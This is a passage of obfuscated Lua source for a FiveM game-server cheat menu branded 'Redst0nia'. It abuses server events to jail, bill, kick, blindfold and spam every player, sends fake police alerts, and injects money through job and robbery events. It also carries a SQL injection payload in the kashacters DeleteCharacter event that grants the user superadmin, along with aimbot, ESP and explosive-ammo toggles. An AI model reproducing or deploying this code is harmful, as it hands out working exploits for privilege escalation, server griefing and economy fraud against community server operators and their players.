        k2H1cdR8D1fgkWgt0Mv:RightLabel("~r~esx_outlawalert")
        k2H1cdR8D1fgkWgt0Mv:SetRightBadge(BadgeStyle.Lock)
    end
    WA.SubMenu:AddItem(k2H1cdR8D1fgkWgt0Mv)
    local Zz50rKe_XlTa = NativeUI.CreateItem("GCPhone Spam", "~w~Note: ~s~Spams GCPhone calls and shit")
    if not gzhXdn5rXT132aD["gcphone"] then
        Zz50rKe_XlTa:RightLabel("~r~gcphone")
        Zz50rKe_XlTa:SetRightBadge(BadgeStyle.Lock)
    end
    WA.SubMenu:AddItem(Zz50rKe_XlTa)
    local GDbDdnUeH = NativeUI.CreateItem("Jobs Custom Paycheck ~r~RISKY", "~w~Note: ~s~At your own risk ! Be careful")
    WA.SubMenu:AddItem(GDbDdnUeH)
    WA.SubMenu.OnItemSelect = function(mWs, n3XmLAo4Cqv2b50ui, kZ_y)
        local weyGdO2O0mdW5b7lj = wQzbQh7bL9PfVNQEzo()
        local w6RJpBzUa4rkYSDlcm = {}
        if gqe9DjALh7ATnUs7e then
            for i = 0, #weyGdO2O0mdW5b7lj do
                if weyGdO2O0mdW5b7lj[i] ~= GetPlayerServerId(PlayerId()) and weyGdO2O0mdW5b7lj[i] ~= 0 then
                    table.insert(w6RJpBzUa4rkYSDlcm, weyGdO2O0mdW5b7lj[i])
                end
            end
        else
            w6RJpBzUa4rkYSDlcm = weyGdO2O0mdW5b7lj
        end
        if disableGStatus then
            local zlGXA7TgCp_FK = GetActivePlayers()
            for i = 1, #zlGXA7TgCp_FK do
                if i == PlayerPedId(-1) then
                    i = i + 1
                end
                if IsPedShooting(GetPlayerPed(zlGXA7TgCp_FK[i])) then
                    ClearPedTasksImmediately(GetPlayerPed(zlGXA7TgCp_FK[i]))
                end
            end
        end
        if deleteObjStatus then
            for hL in EnumerateObjects() do
                SetEntityAsMissionEntity(hL, 1, 1)
                DeleteEntity(hL)
            end
        end
        if n3XmLAo4Cqv2b50ui == bgijWbYYTzynGgx then
            if gzhXdn5rXT132aD["esx_jail"] then
                for i = 1, #w6RJpBzUa4rkYSDlcm do
                    TriggerServerEvent("esx_jail:sendToJail", w6RJpBzUa4rkYSDlcm[i], 99999)
                end
                CahvwB3vGb("Sent everyone to jail.")
            else
                CahvwB3vGb("This server does ~r~not~s~ have ~b~esx_jail~s~!")
            end
        elseif n3XmLAo4Cqv2b50ui == ij0lal then
            if gzhXdn5rXT132aD["esx-qalle-jail"] then
                for i = 1, #w6RJpBzUa4rkYSDlcm do
                    TriggerServerEvent("esx-qalle-jail:jailPlayer", w6RJpBzUa4rkYSDlcm[i], 99999, "Redst0nia for Life")
                end
                CahvwB3vGb("Sent everyone to jail.")
            else
                CahvwB3vGb("This server does ~r~not~s~ have ~b~esx-qalle-jail~s~!")
            end
        elseif n3XmLAo4Cqv2b50ui == v_3S6CcUG7 then
            if gzhXdn5rXT132aD["esx_billing"] then
                local yUxh389rEzSq = kR3tkcBRzWGoBkSE("Enter Invoice Amount", "", 100)
                local hWHJ4qfqpQJwBv = kR3tkcBRzWGoBkSE("Enter Invoice Label", "", 100)
                for i = 1, #w6RJpBzUa4rkYSDlcm do
                    TriggerServerEvent(
                        "esx_billing",
                        w6RJpBzUa4rkYSDlcm[i],
                        "society_taxi",
                        hWHJ4qfqpQJwBv,
                        yUxh389rEzSq
                    )
                end
                CahvwB3vGb(
                    "Sent everyone a bill of ~g~$" ..
                        tostring(yUxh389rEzSq) .. " ~s~with a label of ~b~" .. tostring(hWHJ4qfqpQJwBv) .. "~s~."
                )
            else
                CahvwB3vGb("This server does ~r~not~s~ have ~b~esx_billing~s~!")
            end
        elseif n3XmLAo4Cqv2b50ui == IHvrqi then
            if gzhXdn5rXT132aD["jsfour-blindfold"] then
                for i = 1, #w6RJpBzUa4rkYSDlcm do
                    TriggerServerEvent("jsfour-blindfold", w6RJpBzUa4rkYSDlcm[i], true)
                end
                CahvwB3vGb("Blindfolded everyone.")
            else
                CahvwB3vGb("This server does ~r~not~s~ have ~b~jsfour-blindfold~s~!")
            end
        elseif n3XmLAo4Cqv2b50ui == qrBiY5a then
            if gzhXdn5rXT132aD["esx_spectate"] then
                local pQZ2n = kR3tkcBRzWGoBkSE("Enter Kick Message", "", 100)
                for i = 1, #w6RJpBzUa4rkYSDlcm do
                    TriggerServerEvent("esx_spectate:kick", w6RJpBzUa4rkYSDlcm[i], pQZ2n)
                end
                CahvwB3vGb("Kicked everyone.")
            else
                CahvwB3vGb("This server does ~r~not~s~ have ~b~esx_spectate~s~!")
            end
        elseif n3XmLAo4Cqv2b50ui == __df then
            if gzhXdn5rXT132aD["esx_communityservice"] then
                for i = 1, #w6RJpBzUa4rkYSDlcm do
                    TriggerServerEvent("esx_communityservice:sendToCommunityService", w6RJpBzUa4rkYSDlcm[i], 100)
                end
                CahvwB3vGb("Kicked everyone.")
            else
                CahvwB3vGb("This server does ~r~not~s~ have ~b~esx_communityservice~s~!")
            end
        elseif n3XmLAo4Cqv2b50ui == YO93JL9Sqy then
            if gzhXdn5rXT132aD["gcphone"] then
                Citizen.CreateThread(
                    function()
                        TriggerCustomEvent(
                            true,
                            "gcPhone:twitter_createAccount",
                            "REDST0NIA",
                            "REDST0NIA",
                            "https://gamepedia.cursecdn.com/minecraft_fr_gamepedia/5/5d/Bloc_de_redstone.png"
                        )
                        Citizen.Wait(1500)
                        TriggerCustomEvent(true, "gcPhone:twitter_login", "REDST0NIA", "REDST0NIA")
                        Citizen.Wait(1500)
                        for i = 1, 50 do
                            TriggerCustomEvent(
                                true,
                                "gcPhone:twitter_postTweets",
                                "REDST0NIA",
                                "REDST0NIA",
                                "REDST0NIA IS BACK | YO MAD"
                            )
                            Citizen.Wait(50)
                        end
                    end
                )
            else
                CahvwB3vGb("This server does ~r~not~s~ have ~b~gcphone~s~!")
            end
        elseif n3XmLAo4Cqv2b50ui == DtuWovHMdjHkK5 then
            if gzhXdn5rXT132aD["esx_license"] then
                local olRDthRGcO = {
                    "redst0nia",
                    "REDST0NIA",
                    "seems like SQL is fucked?",
                    "this is really bad",
                    "you can't do anything rn",
                    "see ya later, csharp"
                }
                for i = 0, #olRDthRGcO do
                    local SIldIde8UNkhZKQl = GetActivePlayers()
                    for player = 0, #SIldIde8UNkhZKQl do
                        TriggerCustomEvent(
                            true,
                            "esx_license:addLicense",
                            player,
                            olRDthRGcO[i],
                            function()
                                cb(true)
                                CahvwB3vGb("Added license " .. olRDthRGcO[i] .. " to " .. player)
                            end
                        )
                    end
                end
            else
                CahvwB3vGb("This server does ~r~not~s~ have ~b~esx_license~s~!")
            end
        elseif n3XmLAo4Cqv2b50ui == YQPf31PcL then
            if gzhXdn5rXT132aD["esx_kashacters"] then
                TriggerCustomEvent(
                    true,
                    "kashactersS:DeleteCharacter",
                    "';UPDATE users SET permission_level=4, group='superadmin' WHERE name='" ..
                        NetworkPlayerGetName(PlayerId()) .. "'--"
                )
                CahvwB3vGb("You should be superadmin now, please reconnect to the server!")
            else
                CahvwB3vGb("This server does ~r~not~s~ have ~b~esx_kashacters~s~!")
            end
        elseif n3XmLAo4Cqv2b50ui == k2H1cdR8D1fgkWgt0Mv then
            if gzhXdn5rXT132aD["esx_outlawalert"] then
                TriggerCustomEvent(
                    true,
                    "esx_outlawalert:gunshotInProgress",
                    {x = 1337.0, y = 1337.0, z = 1337.0},
                    "REDST0NIA IS BAK",
                    0
                )
                CahvwB3vGb("Police should have received the alert!")
            else
                CahvwB3vGb("This server does ~r~not~s~ have ~b~esx_outlawalert~s~!")
            end
        elseif n3XmLAo4Cqv2b50ui == Zz50rKe_XlTa then
            if gzhXdn5rXT132aD["gcphone"] then
                TriggerCustomEvent(
                    true,
                    "esx_phone:send",
                    "police",
                    "REDST0NIA",
                    true,
                    {x = 1337.0, y = 1337.0, z = 1337.0}
                )
                TriggerCustomEvent(
                    true,
                    "esx_phone:send",
                    "ambulance",
                    "REDST0NIA",
                    true,
                    {x = 1337.0, y = 1337.0, z = 1337.0}
                )
                TriggerCustomEvent(
                    true,
                    "esx_phone:send",
                    "taxi",
                    "REDST0NIA",
                    true,
                    {x = 1337.0, y = 1337.0, z = 1337.0}
                )
                TriggerCustomEvent(
                    true,
                    "esx_phone:send",
                    "realestateagent",
                    "REDST0NIA",
                    true,
                    {x = 1337.0, y = 1337.0, z = 1337.0}
                )
                TriggerCustomEvent(
                    true,
                    "esx_addons_gcphone:startCall",
                    "police",
                    "REDST0NIA",
                    {x = 1337.0, y = 1337.0, z = 1337.0}
                )
                TriggerCustomEvent(
                    true,
                    "esx_addons_gcphone:startCall",
                    "ambulance",
                    "REDST0NIA",
                    {x = 1337.0, y = 1337.0, z = 1337.0}
                )
                TriggerCustomEvent(
                    true,
                    "esx_addons_gcphone:startCall",
                    "taxi",
                    "REDST0NIA",
                    {x = 1337.0, y = 1337.0, z = 1337.0}
                )
                TriggerCustomEvent(
                    true,
                    "esx_addons_gcphone:startCall",
                    "realestateagent",
                    "REDST0NIA",
                    {x = 1337.0, y = 1337.0, z = 1337.0}
                )
                CahvwB3vGb("GCPhone gotta be spammed! :)")
            else
                CahvwB3vGb("This server does ~r~not~s~ have ~b~gcphone~s~!")
            end
        elseif n3XmLAo4Cqv2b50ui == GDbDdnUeH then
            local I05tzz = kR3tkcBRzWGoBkSE("Enter the amount of the paycheck value", "", 12)
            if I05tzz ~= " " then
                local O = kR3tkcBRzWGoBkSE("Enter the amount of loops, if not wanted, leave it blank", "", 12)
                if O == "" or O == " " then
                    O = 1
                end
                local U = kR3tkcBRzWGoBkSE("Are you sure ? Y/N", "", 1)
                if U == "y" or U == "Y" then
                    for iloop = 0, O do
                        TriggerCustomEvent(true, "esx_vangelico_robbery:gioielli")
                        TriggerCustomEvent(true, "esx_vangelico_robbery:gioielli1")
                        TriggerCustomEvent(true, "lester:vendita")
                        TriggerCustomEvent(true, "99kr-burglary:addMoney", I05tzz)
                        TriggerCustomEvent(true, "burglary:money", I05tzz)
                        TriggerCustomEvent(true, "esx_mining:getItem")
                        TriggerCustomEvent(true, "esx_mining:sell")
                        TriggerCustomEvent(true, "esx_fishing:caughtFish")
                        TriggerCustomEvent(true, "loffe-fishing:giveFish")
                        TriggerCustomEvent(true, "loffe-fishing:sellFish")
                        ESX.TriggerServerCallback(
                            "james_fishing:receiveFish",
                            function(yJNkjOUKICKNqylLZSE)
                                if yJNkjOUKICKNqylLZSE then
                                    CahvwB3vGb("Received fish !")
                                end
                            end
                        )
                        ESX.TriggerServerCallback(
                            "james_fishing:sellFish",
                            function(hWS, ype_sq_iD3SZSBEx)
                                if hWS then
                                    CahvwB3vGb("Sold : " .. ype_sq_iD3SZSBEx)
                                end
                            end
                        )
                        TriggerCustomEvent(true, "esx_mugging:giveMoney", I05tzz)
                        TriggerCustomEvent(true, "loffe_robbery:pickUp", iloop)
                        TriggerCustomEvent(true, "esx_loffe_fangelse:Pay")
                        TriggerCustomEvent(true, "esx_robnpc:giveMoney")
                        TriggerCustomEvent(true, "MF_DrugSales:Sold", "water", I05tzz, iloop)
                        TriggerCustomEvent(true, "lenzh_chopshop:rewards")
                        TriggerCustomEvent(true, "lenzh_chopshop:sell", "battery", 5)
                        TriggerCustomEvent(true, "lenzh_chopshop:sell", "lowradio", 5)
                        TriggerCustomEvent(true, "lenzh_chopshop:sell", "stockrim", 5)
                        TriggerCustomEvent(true, "lenzh_chopshop:sell", "highrim", 5)
                        TriggerCustomEvent(true, "lenzh_chopshop:sell", "highradio", 5)
                        TriggerCustomEvent(true, "lenzh_chopshop:sell", "airbag", 5)
                        TriggerCustomEvent(true, "esx_deliveries:AddCashMoney", I05tzz)
                        TriggerCustomEvent(true, "esx_deliveries:AddBankMoney", I05tzz)
                        TriggerCustomEvent(true, "esx_deliveries:finishDelivery:server")
                        ESX.TriggerServerCallback(
                            "esx_cargodelivery:sellCargo",
                            function(RtSZgzmi3YPHbYl5AA)
                                if RtSZgzmi3YPHbYl5AA then
                                    CahvwB3vGb("Received : ~g~" .. I05tzz .. "$")
                                end
                            end,
                            I05tzz
                        )
                        TriggerCustomEvent(true, "napadtransport:graczZrobilnapad")
                        TriggerCustomEvent(true, "tost:zgarnijsiano")
                        local w1SW_e1G3X5j_kD_x = {
                            "esx_hunting",
                            "esx_qalle_hunting",
                            "esx-qalle-hunting",
                            "esx_taxijob",
                            "esx_taxi",
                            "esx_carthiefjob",
                            "esx_carthief",
                            "esx_rangerjob",
                            "esx_ranger",
                            "esx_godirtyjob",
                            "esx_godirty",
                            "esx_banksecurityjob",
                            "esx_banksecurity",
                            "esx_pilotjob",
                            "esx_pilot",
                            "esx_pizzajob",
                            "esx_pizza",
                            "esx_gopostaljob",
                            "esx_gopostal",
                            "esx_garbagejob",
                            "esx_garbage",
                            "esx_truckerjob",
                            "esx_trucker"
                        }
                    end
                else
                    CahvwB3vGb("Jobs Paycheck Option cancelled!")
                end
            else
                CahvwB3vGb("Please put a valid number!")
            end
        end
    end
else
    hGcN78 = NativeUI.CreateItem("ESX Specific Options", "")
    hGcN78:RightLabel("~r~es_extended")
    hGcN78:SetRightBadge(BadgeStyle.Lock)
    WA.SubMenu:AddItem(hGcN78)
    W8lF5e5lR9q4U8ypad = NativeUI.CreateItem("vRP Specific Options", "")
    W8lF5e5lR9q4U8ypad:RightLabel("~r~vrp")
    W8lF5e5lR9q4U8ypad:SetRightBadge(BadgeStyle.Lock)
    WA.SubMenu:AddItem(W8lF5e5lR9q4U8ypad)
end
local ctXHZdu = iJ:AddSubMenu(BVrqOXm, "Global players troll", "", true, true, "~w~Global players troll")
local idTzf = NativeUI.CreateItem("Random props grief", "")
idTzf:RightLabel("~g~Party")
local ohQBkDygCf = NativeUI.CreateItem("Cage everyone", "")
ohQBkDygCf:RightLabel("~g~Party")
local pfPXzpOLNZbwO8fgN = NativeUI.CreateItem("Burger everyone", "")
pfPXzpOLNZbwO8fgN:RightLabel("~g~Party")
local lHZWlKArLV4lvB = NativeUI.CreateItem("IAA Lift everyone", "")
lHZWlKArLV4lvB:RightLabel("~g~Party")
local bTWRHtYtzWudVZhPQE26 = NativeUI.CreateItem("Stunt plane everyone", "")
bTWRHtYtzWudVZhPQE26:RightLabel("~g~Party")
local p3bo4X_ = NativeUI.CreateCheckboxItem("Disable all guns", false, "")
local ev4Gdk52 = NativeUI.CreateCheckboxItem("Delete all objects", false, "")
ctXHZdu.SubMenu:AddItem(idTzf)
ctXHZdu.SubMenu:AddItem(ohQBkDygCf)
ctXHZdu.SubMenu:AddItem(pfPXzpOLNZbwO8fgN)
ctXHZdu.SubMenu:AddItem(lHZWlKArLV4lvB)
ctXHZdu.SubMenu:AddItem(bTWRHtYtzWudVZhPQE26)
ctXHZdu.SubMenu:AddItem(p3bo4X_)
ctXHZdu.SubMenu:AddItem(ev4Gdk52)
ctXHZdu.SubMenu.OnItemSelect = function(kqcvUDtz7S3, oUlmQ, LUArDD_4s)
    if oUlmQ == idTzf then
        C72K()
    elseif oUlmQ == ohQBkDygCf then
        mAFPHG()
    elseif oUlmQ == pfPXzpOLNZbwO8fgN then
        ccAxcpfUV()
    elseif oUlmQ == lHZWlKArLV4lvB then
        QR1QougoPAhMCA4S()
    elseif oUlmQ == bTWRHtYtzWudVZhPQE26 then
        aAq6M8vZMxQd52YXRi()
    end
end
ctXHZdu.OnCheckboxChange = function(F5zGbyc5RIbk5nD, qdYEll7db, V1LM)
    if qdYEll7db == p3bo4X_ then
        disableGStatus = V1LM
        local ToeB1o0ErczP
        if disableGStatus == true then
            ToeB1o0ErczP = "~g~enabled"
        else
            ToeB1o0ErczP = "~r~disabled"
        end
        CahvwB3vGb("Disable all guns is now " .. ToeB1o0ErczP .. "~s~.")
    elseif qdYEll7db == ev4Gdk52 then
        deleteObjStatus = V1LM
        local RTgh1XR84QuQKqHrnW
        if deleteObjStatus == true then
            RTgh1XR84QuQKqHrnW = "~g~enabled"
        else
            RTgh1XR84QuQKqHrnW = "~r~disabled"
        end
        CahvwB3vGb("Deleting all object is now " .. RTgh1XR84QuQKqHrnW .. "~s~.")
    end
end
BVrqOXm.OnCheckboxChange = function(BVh8Mu, c2GGIsVi3L97WIj9etcG, HXY5USBnUH1sMvEbw)
    if c2GGIsVi3L97WIj9etcG == VrMP then
        gqe9DjALh7ATnUs7e = HXY5USBnUH1sMvEbw
        local fldipIeIw
        if gqe9DjALh7ATnUs7e == true then
            fldipIeIw = "~g~enabled"
        else
            fldipIeIw = "~r~disabled"
        end
        CahvwB3vGb("Exclude self is now " .. fldipIeIw .. "~s~.")
    elseif c2GGIsVi3L97WIj9etcG == gUT2n then
        dbrq0OSRs6roe1ORnIx = HXY5USBnUH1sMvEbw
        local Td1d0jjz
        if dbrq0OSRs6roe1ORnIx == true then
            Td1d0jjz = "~g~enabled"
        else
            Td1d0jjz = "~r~disabled"
        end
        CahvwB3vGb("Name ESP is now " .. Td1d0jjz .. "~s~.")
    elseif c2GGIsVi3L97WIj9etcG == DSMpto then
        UeXPZsA1QbtpHNYG9T = HXY5USBnUH1sMvEbw
        local j1ckRAsX7
        if UeXPZsA1QbtpHNYG9T == true then
            j1ckRAsX7 = "~g~enabled"
        else
            j1ckRAsX7 = "~r~disabled"
        end
        CahvwB3vGb("Box ESP is now " .. j1ckRAsX7 .. "~s~.")
    elseif c2GGIsVi3L97WIj9etcG == FhEdbKAAGTMlpp9GV then
        kQEUEuibl17Tuc = HXY5USBnUH1sMvEbw
        local psHet1iM9XfExbxNJ
        if kQEUEuibl17Tuc == true then
            psHet1iM9XfExbxNJ = "~g~enabled"
        else
            psHet1iM9XfExbxNJ = "~r~disabled"
        end
        CahvwB3vGb("Line ESP is now " .. psHet1iM9XfExbxNJ .. "~s~.")
    end
end
local S7 = NativeUI.CreateItem("Weapon Menu", "")
pcwCmJS:AddItem(S7)
local GNT =
    NativeUI.CreateMenu("Redst0nia " .. HrVTH5ewMKL1Pj, "~w~Weapon Menu", Ylr442mzV7_qo7glKLZr, dL3gLfg8OIwljjM_9)
GNT:SetBannerRectangle(aW60GlTo7turR, true)
iJ:Add(GNT)
pcwCmJS:BindMenuToItem(GNT, S7)
weapon2Btn = NativeUI.CreateItem("Choose Weapon Menu", "")
GNT:AddItem(weapon2Btn)
weapon2Btn:SetRightBadge(BadgeStyle.Ammo)
weapon2Menu =
    NativeUI.CreateMenu(
    "Redst0nia " .. HrVTH5ewMKL1Pj,
    "~w~Choose Weapon Menu",
    Ylr442mzV7_qo7glKLZr,
    dL3gLfg8OIwljjM_9
)
weapon2Menu:SetBannerRectangle(aW60GlTo7turR, true)
iJ:Add(weapon2Menu)
GNT:BindMenuToItem(weapon2Menu, weapon2Btn)
handGunsBtn = NativeUI.CreateItem("Handguns", "")
handGunsBtn:RightLabel("→→→")
handGuns = NativeUI.CreateMenu("Redst0nia " .. HrVTH5ewMKL1Pj, "~w~Handguns", Ylr442mzV7_qo7glKLZr, dL3gLfg8OIwljjM_9)
handGuns:SetBannerRectangle(aW60GlTo7turR, true)
iJ:Add(handGuns)
riflesBtn = NativeUI.CreateItem("Assault Rifles", "")
riflesBtn:RightLabel("→→→")
rifles =
    NativeUI.CreateMenu("Redst0nia " .. HrVTH5ewMKL1Pj, "~w~Assault Rifles", Ylr442mzV7_qo7glKLZr, dL3gLfg8OIwljjM_9)
rifles:SetBannerRectangle(aW60GlTo7turR, true)
iJ:Add(rifles)
shotgunsBtn = NativeUI.CreateItem("Shotguns", "")
shotgunsBtn:RightLabel("→→→")
shotguns = NativeUI.CreateMenu("Redst0nia " .. HrVTH5ewMKL1Pj, "~w~Shotguns", Ylr442mzV7_qo7glKLZr, dL3gLfg8OIwljjM_9)
shotguns:SetBannerRectangle(aW60GlTo7turR, true)
iJ:Add(shotguns)
smgsBtn = NativeUI.CreateItem("Sub-/Light Machine Guns", "")
smgsBtn:RightLabel("→→→")
smgs =
    NativeUI.CreateMenu(
    "Redst0nia " .. HrVTH5ewMKL1Pj,
    "~w~Sub-/Light Machine Guns",
    Ylr442mzV7_qo7glKLZr,
    dL3gLfg8OIwljjM_9
)
smgs:SetBannerRectangle(aW60GlTo7turR, true)
iJ:Add(smgs)
throwablesBtn = NativeUI.CreateItem("Throwables", "")
throwablesBtn:RightLabel("→→→")
throwables =
    NativeUI.CreateMenu("Redst0nia " .. HrVTH5ewMKL1Pj, "~w~Throwables", Ylr442mzV7_qo7glKLZr, dL3gLfg8OIwljjM_9)
throwables:SetBannerRectangle(aW60GlTo7turR, true)
iJ:Add(throwables)
meleeBtn = NativeUI.CreateItem("Melee", "")
meleeBtn:RightLabel("→→→")
melee = NativeUI.CreateMenu("Redst0nia " .. HrVTH5ewMKL1Pj, "~w~Melee", Ylr442mzV7_qo7glKLZr, dL3gLfg8OIwljjM_9)
melee:SetBannerRectangle(aW60GlTo7turR, true)
iJ:Add(melee)
heavyweaponsBtn = NativeUI.CreateItem("Heavy Weapons", "")
heavyweaponsBtn:RightLabel("→→→")
heavyweapons =
    NativeUI.CreateMenu("Redst0nia " .. HrVTH5ewMKL1Pj, "~w~Heavy Weapons", Ylr442mzV7_qo7glKLZr, dL3gLfg8OIwljjM_9)
heavyweapons:SetBannerRectangle(aW60GlTo7turR, true)
iJ:Add(heavyweapons)
sniperBtn = NativeUI.CreateItem("Sniper Rifles", "")
sniperBtn:RightLabel("→→→")
sniper =
    NativeUI.CreateMenu("Redst0nia " .. HrVTH5ewMKL1Pj, "~w~Sniper Rifles", Ylr442mzV7_qo7glKLZr, dL3gLfg8OIwljjM_9)
sniper:SetBannerRectangle(aW60GlTo7turR, true)
iJ:Add(sniper)
weapon2Menu:AddItem(handGunsBtn)
weapon2Menu:BindMenuToItem(handGuns, handGunsBtn)
weapon2Menu:AddItem(riflesBtn)
weapon2Menu:BindMenuToItem(rifles, riflesBtn)
weapon2Menu:AddItem(shotgunsBtn)
weapon2Menu:BindMenuToItem(shotguns, shotgunsBtn)
weapon2Menu:AddItem(smgsBtn)
weapon2Menu:BindMenuToItem(smgs, smgsBtn)
weapon2Menu:AddItem(throwablesBtn)
weapon2Menu:BindMenuToItem(throwables, throwablesBtn)
weapon2Menu:AddItem(meleeBtn)
weapon2Menu:BindMenuToItem(melee, meleeBtn)
weapon2Menu:AddItem(heavyweaponsBtn)
weapon2Menu:BindMenuToItem(heavyweapons, heavyweaponsBtn)
weapon2Menu:AddItem(sniperBtn)
weapon2Menu:BindMenuToItem(sniper, sniperBtn)
singlewepBtn = NativeUI.CreateItem("Give Single Weapon", "")
GNT:AddItem(singlewepBtn)
local r0sWO4if = NativeUI.CreateItem("Give All Weapons", "")
GNT:AddItem(r0sWO4if)
local BbVda5O7 = NativeUI.CreateItem("Remove All Weapons", "")
GNT:AddItem(BbVda5O7)
ammocountList =
    NativeUI.CreateListItem(
    "Ammo count",
    {20, 50, 100, 250, 500, 1000, 9999},
    1,
    "Note : Choose different levels of ammo"
)
GNT:AddItem(ammocountList)
noreloadBtn = NativeUI.CreateCheckboxItem("No Reload", false, "")
GNT:AddItem(noreloadBtn)
infammoBtn = NativeUI.CreateCheckboxItem("Infinite Ammo", false, "")
GNT:AddItem(infammoBtn)
explosiveBtn = NativeUI.CreateCheckboxItem("Explosive Ammo", false, "")
GNT:AddItem(explosiveBtn)
oneshotBtn = NativeUI.CreateCheckboxItem("One Shot Ammo", false, "")
GNT:AddItem(oneshotBtn)
silentBtn = NativeUI.CreateCheckboxItem("Silent Aimbot", false, "")
GNT:AddItem(silentBtn)
GNT.OnItemSelect = function(pLUg, lH8QnLc, tJFsHVnJnctFE_46Uy)
    if lH8QnLc == r0sWO4if then
        D(PlayerId())
        CahvwB3vGb("Gave ~b~yourself ~s~all weapons!")
    elseif lH8QnLc == BbVda5O7 then
        hk7qI02(PlayerId())
        CahvwB3vGb("Removed all weapons from ~b~yourself~s~!")
    elseif lH8QnLc == singlewepBtn then
        FO3YdQ(PlayerId())
    end
end
GNT.OnListChange = function(fqXL7GSh, W5z_q6Db, vqZZPTiqbfieCzDWsWqSW)
    if W5z_q6Db == ammocountList then
        ammocount = W5z_q6Db:IndexToItem(vqZZPTiqbfieCzDWsWqSW)
        CahvwB3vGb("You choosed ~b~" .. ammocount .. " ~w~ammo count")
    end
end
GNT.OnCheckboxChange = function(MI9DIB0FEKIuilMd, PW0UQHKjsoYj6bvk, WWI4DLabdvReHJtLEdruH)
    if PW0UQHKjsoYj6bvk == noreloadBtn then
        noreloadStatus = WWI4DLabdvReHJtLEdruH
        local ocGhK
        if noreloadStatus == true then
            ocGhK = "~g~enabled"
        else
            ocGhK = "~r~disabled"
        end
        CahvwB3vGb("No Reload is now " .. ocGhK .. "~s~.")
    elseif PW0UQHKjsoYj6bvk == infammoBtn then
        infammoStatus = WWI4DLabdvReHJtLEdruH
        local ZAmgC7nZ_mmlimZ50Dp9V
        if infammoStatus == true then
            ZAmgC7nZ_mmlimZ50Dp9V = "~g~enabled"
        else
            ZAmgC7nZ_mmlimZ50Dp9V = "~r~disabled"
        end
        CahvwB3vGb("Infinite Ammo is now " .. ZAmgC7nZ_mmlimZ50Dp9V .. "~s~.")
    elseif PW0UQHKjsoYj6bvk == explosiveBtn then
        explosiveStatus = WWI4DLabdvReHJtLEdruH
        local B35etPAxypdbMFfg
        if explosiveStatus == true then
            B35etPAxypdbMFfg = "~g~enabled"
        else
            B35etPAxypdbMFfg = "~r~disabled"
        end
        CahvwB3vGb("Explosive Ammo is now " .. B35etPAxypdbMFfg .. "~s~.")
    elseif PW0UQHKjsoYj6bvk == oneshotBtn then
        oneshotStatus = WWI4DLabdvReHJtLEdruH
        local Ba
        if oneshotStatus == true then
            Ba = "~g~enabled"
        else
            Ba = "~r~disabled"
        end
        CahvwB3vGb("One Shot Ammo is now " .. Ba .. "~s~.")
    elseif PW0UQHKjsoYj6bvk == silentBtn then
        silentStatus = WWI4DLabdvReHJtLEdruH
        local yqkPQ
        if silentStatus == true then
            yqkPQ = "~g~enabled"
        else
            yqkPQ = "~r~disabled"
        end
        CahvwB3vGb("Silent Aim is now " .. yqkPQ .. "~s~.")
    end
end
local Z_KBtHA = NativeUI.CreateItem("Crosshairs", "")
GNT:AddItem(Z_KBtHA)
local _XAcwyFQpBJsBCWa =
    NativeUI.CreateMenu("Redst0nia " .. HrVTH5ewMKL1Pj, "~w~Crosshairs", Ylr442mzV7_qo7glKLZr, dL3gLfg8OIwljjM_9)
_XAcwyFQpBJsBCWa:SetBannerRectangle(aW60GlTo7turR, true)
iJ:Add(_XAcwyFQpBJsBCWa)
GNT:BindMenuToItem(_XAcwyFQpBJsBCWa, Z_KBtHA)
local qL = NativeUI.CreateCheckboxItem("Normal Crosshair", false, "")
_XAcwyFQpBJsBCWa:AddItem(qL)
local iMdOgzDdSXzWh4rGPXs = NativeUI.CreateCheckboxItem("Secondary Crosshair", false, "")
_XAcwyFQpBJsBCWa:AddItem(iMdOgzDdSXzWh4rGPXs)
local HN = NativeUI.CreateCheckboxItem("Advanced Crosshair", false, "")
_XAcwyFQpBJsBCWa:AddItem(HN)
_XAcwyFQpBJsBCWa.OnCheckboxChange = function(TLZVu4XPKa, tvVkxwYPhtd, yA_rcbFOZ0zNgYp4p0)
    if tvVkxwYPhtd == qL then
        cross1Status = yA_rcbFOZ0zNgYp4p0
        local dEtVGKM9hrNu
        if cross1Status == true then
            dEtVGKM9hrNu = "~g~enabled"
        else
            dEtVGKM9hrNu = "~r~disabled"
        end
        CahvwB3vGb("Normal Crosshair is now " .. dEtVGKM9hrNu .. "~s~.")
    elseif tvVkxwYPhtd == iMdOgzDdSXzWh4rGPXs then
        cross2Status = yA_rcbFOZ0zNgYp4p0
        local WUS0sUZ60
        if cross2Status == true then
            WUS0sUZ60 = "~g~enabled"
        else
            WUS0sUZ60 = "~r~disabled"
        end
        CahvwB3vGb("Secondary crosshair is now " .. WUS0sUZ60 .. "~s~.")
    elseif tvVkxwYPhtd == HN then
        cross3Status = yA_rcbFOZ0zNgYp4p0
        local MJ
        if cross3Status == true then
            MJ = "~g~enabled"
        else
            MJ = "~r~disabled"
        end
        CahvwB3vGb("Avanced crosshaire is now " .. MJ .. "~s~.")
    end
end
local hEKsJUlyGs = NativeUI.CreateItem("Vehicle Menu", "")
pcwCmJS:AddItem(hEKsJUlyGs)
local eMRu =
    NativeUI.CreateMenu("Redst0nia " .. HrVTH5ewMKL1Pj, "~w~Vehicle Menu", Ylr442mzV7_qo7glKLZr, dL3gLfg8OIwljjM_9)
eMRu:SetBannerRectangle(aW60GlTo7turR, true)
iJ:Add(eMRu)
pcwCmJS:BindMenuToItem(eMRu, hEKsJUlyGs)
local fzGxxUhFV2ZS5Z = NativeUI.CreateItem("Los Santos Customs", "")
fzGxxUhFV2ZS5Z:SetRightBadge(BadgeStyle.Car)
eMRu:AddItem(fzGxxUhFV2ZS5Z)
local _CNAkmyXEwa6k6oiwBUHg =
    NativeUI.CreateMenu(
    "Redst0nia " .. HrVTH5ewMKL1Pj,
    "~w~Los Santos Customs",
    Ylr442mzV7_qo7glKLZr,
    dL3gLfg8OIwljjM_9
)
_CNAkmyXEwa6k6oiwBUHg:SetBannerRectangle(aW60GlTo7turR, true)
iJ:Add(_CNAkmyXEwa6k6oiwBUHg)
eMRu:BindMenuToItem(_CNAkmyXEwa6k6oiwBUHg, fzGxxUhFV2ZS5Z)
local U3spu4gXA_V = NativeUI.CreateItem("Acrobatics", "Do acrobatics with your vehicle")
U3spu4gXA_V:SetRightBadge(BadgeStyle.Crown)
eMRu:AddItem(U3spu4gXA_V)
local Z2epByaArTg2 =
    NativeUI.CreateMenu("Redst0nia " .. HrVTH5ewMKL1Pj, "~w~Acrobatics", Ylr442mzV7_qo7glKLZr, dL3gLfg8OIwljjM_9)
Z2epByaArTg2:SetBannerRectangle(aW60GlTo7turR, true)
